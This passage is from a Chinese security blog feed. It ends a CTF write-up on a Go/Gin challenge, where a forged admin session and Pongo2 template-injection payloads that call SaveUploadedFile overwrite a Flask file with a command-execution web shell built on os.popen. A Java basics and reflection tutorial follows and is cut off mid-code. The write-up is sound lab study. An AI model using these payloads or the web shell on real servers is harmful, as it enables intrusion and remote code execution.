xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三条路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ : 设置一个guest的客户端session</span><br><span class="line">/admin : 鉴权是否为admin, 若是, 接受一个name参数, 并使用 Pongo2 模板引擎渲染参数值</span><br><span class="line">/flask : 访问内网的flask服务</span><br></pre></td></tr></table></figure><p>看了题解, 这里的os.Getenv(“SESSION_KEY”), </p><p>SESSION_KEY环境变量并没有设置, 导致可以伪造session</p><p>本地搭建了go环境, 直接把源码修改一下在本地运行, 让他返回一个admin的session</p><p>修改index路由, 返回admin的session而不是guest的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span> <span class="comment">/////////修改为admin</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240314215648315.png" alt="image-20240314215648315"></p><p>拿这这个session去&#x2F;admin路由鉴权</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240314220545328.png" alt="image-20240314220545328"></p><p>可以看见模板字符串被渲染了, 存在ssti</p><p>再看后端flask</p><p>不传规定的参数name, 随便穿个参数让他报错出源码</p><p>GET &#x2F;flask?name&#x3D;?a&#x3D;1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>开启了debug, 也就意味着改变源码后服务器会立即更新, </p><p>这里就用到了SaveUploadedFile方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(&quot;file&quot;),&quot;/app/server.py&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>c.FormFile(“file”)返回表单数据中name为file的文件, SaveUploadedFile将该文件保存到”&#x2F;app&#x2F;server.py”</p><p>但是这里有一步html特殊字符的转义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.EscapeString(name)</span><br></pre></td></tr></table></figure><p>所以payload中的引号会被转义掉</p><p>这里又引入了c.Request.Referer()或c.Request.UserAgent()方法, 顾名思义就是返回UA或者Referer的值(字符串)</p><p>还有一种方法是HandlerName() 方法，用于返回主处理程序的名称，这里返回的就是admin&#x2F;route.Admin，如何可以使用last过滤器获取最后一个字符n</p><p>两种payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125;&#125;</span><br></pre></td></tr></table></figure><p>准备一个要替换上去的server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    cmd = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    file=os.popen(cmd).read()</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>方便起见, 最直接用ApiPost7设置好http headers和请求参数, 上传的文件</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315001841245.png" alt="image-20240315001841245"></p><p>之后访问flask,得到flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315002025364.png" alt="image-20240315002025364"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#go_session">https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#go_session</a></p><p><a href="https://blog.csdn.net/qq_62068476/article/details/132292872">https://blog.csdn.net/qq_62068476/article/details/132292872</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN2019-华北赛区-Day2-Web1-Hack-World&quot;&gt;&lt;a href=&quot;#CISCN2019-华北赛区-Day2-Web1-Hack-World&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华北赛区 Day2 W</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java安全基础</title>
    <link href="http://example.com/2024/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</id>
    <published>2024-03-08T12:29:02.000Z</published>
    <updated>2024-03-09T14:24:18.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java基础语法"><a href="#Java基础语法" class="headerlink" title="Java基础语法"></a>Java基础语法</h1><h2 id="SOUT和SOUF输出"><a href="#SOUT和SOUF输出" class="headerlink" title="SOUT和SOUF输出"></a>SOUT和SOUF输出</h2><h3 id="SOUT"><a href="#SOUT" class="headerlink" title="SOUT"></a>SOUT</h3><p>不能使用格式化字符串, 但可以使用<code>+</code>拼接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.print(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world!&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world!&quot;</span>); <span class="comment">// 末尾自动补一个换行符</span></span><br></pre></td></tr></table></figure><h3 id="SOUF"><a href="#SOUF" class="headerlink" title="SOUF"></a>SOUF</h3><p>可以使用格式化字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world and %s!&quot;</span>, <span class="string">&quot;you&quot;</span>);</span><br><span class="line"><span class="comment">//hello,world and you!</span></span><br></pre></td></tr></table></figure><h2 id="Scanner输入"><a href="#Scanner输入" class="headerlink" title="Scanner输入"></a>Scanner输入</h2><p><strong>两种输入方式<code>next()，nextline()</code></strong></p><h3 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h3><p>以空格为结束符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(input.hasNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> input.next();</span><br><span class="line">            System.out.printf(<span class="string">&quot;hello %s&quot;</span>, str);</span><br><span class="line">        &#125;</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308204606772.png" alt="image-20240308204606772"></p><h3 id="nextline"><a href="#nextline" class="headerlink" title="nextline()"></a>nextline()</h3><p>以回车为结束符</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>与C语言完全相同</p><h2 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h2><p>自动遍历数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] numbers = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : numbers) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类与继承"><a href="#类与继承" class="headerlink" title="类与继承"></a>类与继承</h2><p><strong>小知识</strong></p><blockquote><ul><li><strong>Public类：</strong> 一个Java文件中只能有一个<code>public</code>类，并且这个<code>public</code>类的名称必须与文件名相同。这样的类可以从其他包中访问。</li><li><strong>非public类：</strong> 一个Java文件可以包含多个非public类，它们的访问级别被限制在同一包中。这些类不能被其他包中的类直接访问。</li></ul></blockquote><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;I am %s, and I am %d years old.\n&quot;</span>, name, age);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">n4c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;1 year later,&quot;</span>);</span><br><span class="line">        n4c1.setAge(<span class="number">20</span>);</span><br><span class="line">        System.out.printf(<span class="string">&quot;I will be %d&quot;</span>, n4c1.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308210528171.png" alt="image-20240308210528171"></p><p><strong>extends</strong></p><p>SuperMan.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SuperMan</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SuperMan</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123; <span class="comment">//创建构造器</span></span><br><span class="line">        <span class="built_in">super</span>(name, age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">superPower</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can do this all day!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SuperMan</span> <span class="variable">n4c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SuperMan</span>(<span class="string">&quot;n4c1&quot;</span> ,<span class="number">19</span>);</span><br><span class="line">        n4c1.superPower();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308213418330.png" alt="image-20240308213418330"></p><p><strong>implements</strong></p><p>略</p><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>与php相似</p><p>略</p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><blockquote><p>接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p></blockquote><blockquote><h4 id="接口与类的区别："><a href="#接口与类的区别：" class="headerlink" title="接口与类的区别："></a>接口与类的区别：</h4><ul><li>接口不能用于实例化对象。</li><li>接口没有构造方法。</li><li>接口中所有的方法必须是抽象方法，Java 8 之后 接口中可以使用 default 关键字修饰的非抽象方法。</li><li>接口不能包含成员变量，除了 static 和 final 变量。</li><li>接口不是被类继承了，而是要被类实现。</li><li>接口支持多继承。</li></ul><h4 id="接口特性"><a href="#接口特性" class="headerlink" title="接口特性"></a>接口特性</h4><ul><li>接口中每一个方法也是隐式抽象的,接口中的方法会被隐式的指定为 <strong>public abstract</strong>（只能是 public abstract，其他修饰符都会报错）。</li><li>接口中可以含有变量，但是接口中的变量会被隐式的指定为 <strong>public static final</strong> 变量（并且只能是 public，用 private 修饰会报编译错误）。</li><li>接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。</li></ul><h4 id="抽象类和接口的区别"><a href="#抽象类和接口的区别" class="headerlink" title="抽象类和接口的区别"></a>抽象类和接口的区别</h4><ul><li><ol><li>抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。</li></ol></li><li><ol start="2"><li>抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 <strong>public static final</strong> 类型的。</li></ol></li><li><ol start="3"><li>接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。</li></ol></li><li><ol start="4"><li>一个类只能继承一个抽象类，而一个类却可以实现多个接口。</li></ol></li></ul></blockquote><h3 id="接口的实现"><a href="#接口的实现" class="headerlink" title="接口的实现"></a>接口的实现</h3><p>当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。</p><p>Animal.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dog.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog eat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog travel&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.eat();</span><br><span class="line">        dog.travel();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 Dog eat</span></span><br><span class="line"><span class="comment">//   Dog travel</span></span><br></pre></td></tr></table></figure><h3 id="接口的多继承"><a href="#接口的多继承" class="headerlink" title="接口的多继承"></a>接口的多继承</h3><p>在Java中，类的多继承是不合法，但接口允许多继承。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hockey</span> <span class="keyword">extends</span> <span class="title class_">Sports</span>, Event</span><br></pre></td></tr></table></figure><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>在Java中，集合（Collection）是一种用于存储和操作一组对象的数据结构。集合框架（Collection Framework）是Java中的一个重要部分，提供了一系列接口和类，用于表示和操作不同类型的集合。Java的集合框架主要包括以下接口和类：</p><ol><li><strong>Collection 接口：</strong> 是所有集合框架的根接口，它定义了一些基本的方法，如添加、删除、遍历等。<code>List</code>、<code>Set</code> 和 <code>Queue</code> 接口都继承自 <code>Collection</code>。</li><li><strong>List 接口：</strong> 继承自 <code>Collection</code>，表示有序的集合，允许包含重复元素。常见的实现类包括 <code>ArrayList</code>、<code>LinkedList</code> 和 <code>Vector</code>。</li><li><strong>Set 接口：</strong> 也继承自 <code>Collection</code>，表示不包含重复元素的集合。常见的实现类包括 <code>HashSet</code>、<code>LinkedHashSet</code> 和 <code>TreeSet</code>。</li><li><strong>Queue 接口：</strong> 继承自 <code>Collection</code>，表示一种队列的数据结构，常见的实现类包括 <code>LinkedList</code> 和 <code>PriorityQueue</code>。</li><li><strong>Map 接口：</strong> 表示键值对的集合，每个键映射到一个值。常见的实现类包括 <code>HashMap</code>、<code>LinkedHashMap</code>、<code>TreeMap</code> 和 <code>HashTable</code>。</li></ol><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>反射有关的API：</p><blockquote><p>java.lang.Class: 代表一个类<br>java.lang.reflect.Method: 代表类的方法<br>java.lang.relect.Field: 代表类的成员变量<br>java.lang.reflect.Constructor: 代表类的构造器</p></blockquote><p>由于Class类是private私有属性, 其构造器是私有的, 我们无法直接new Class();围绕如何获取Class类的对象来学习反射机制</p><h2 id="类的-class属性"><a href="#类的-class属性" class="headerlink" title="类的.class属性"></a>类的.class属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Person.class;  <span class="comment">///////////////////////</span></span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出: class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><h2 id="实例化对象的getClass-方法"><a href="#实例化对象的getClass-方法" class="headerlink" title="实例化对象的getClass()方法"></a>实例化对象的getClass()方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> p1.getClass(); <span class="comment">/////////////////</span></span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: I am n4c1, and I am 19 years old.</span></span><br><span class="line"><span class="comment">//class com.n4c1.www.Person</span></span><br></pre></td></tr></table></figure><h2 id="Class-forName-String-className-：动态加载类"><a href="#Class-forName-String-className-：动态加载类" class="headerlink" title="Class.forName(String className)：动态加载类"></a>Class.forName(String className)：动态加载类</h2><p>调用Class类中的forName方法，将字节码文件加载进内存，返回Class对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title 